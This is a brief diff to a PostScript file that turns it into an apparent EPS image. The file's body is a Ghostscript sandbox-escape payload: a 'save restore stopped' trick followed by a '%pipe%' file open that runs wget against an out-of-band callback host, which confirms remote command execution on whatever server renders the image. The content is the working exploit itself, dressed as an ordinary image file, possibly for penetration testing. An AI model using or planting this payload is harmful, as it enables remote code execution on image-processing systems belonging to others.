@@ -1,4 +1,6 @@
-%PS
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: -0 -0 100 100
+
 0 1 300367 {} for
 {save restore} stopped {} if
 (%pipe%wget http://ayc0nkl0sm95wqkgyls0penu4lady2.burpcollaborator.net) (w) file
